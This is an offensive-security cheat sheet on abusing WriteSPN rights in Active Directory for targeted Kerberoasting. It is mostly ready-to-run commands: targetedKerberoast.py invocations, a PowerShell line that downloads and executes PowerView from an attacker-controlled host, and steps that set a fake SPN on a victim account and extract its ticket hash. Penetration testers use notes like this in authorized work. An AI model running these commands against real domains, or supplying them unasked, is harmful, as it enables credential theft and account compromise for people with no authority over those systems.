# WriteSPN abuse

### USER have WriteSPN over USER:

If an user have WriteSPN over another user will be able to get the hash of that user. To do it will become that user "kerberoasteble".

#### From Linux (externally, recomended):

With password -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>' -p '<password>'`

With nt hash  -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>' -H :<nt hash>`

Note: If clock error appears "KRB_AP_ERR_SKEW" use kerberos sync command before.

<br>

#### From Windows (internally):

Load powerview module first -> `IEX (new-object net.webclient).downloadstring('http://your_evil_ip_or_domain/powerview.ps1')`

Make sur that the target account has no SPN -> `Get-DomainUser '<victimuser>' | Select serviceprincipalname`

Set the SPN -> `Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}`

Obtain a kerberoast hash -> `$User = Get-DomainUser '<victimuser>' ; $User | Get-DomainSPNTicket | fl`







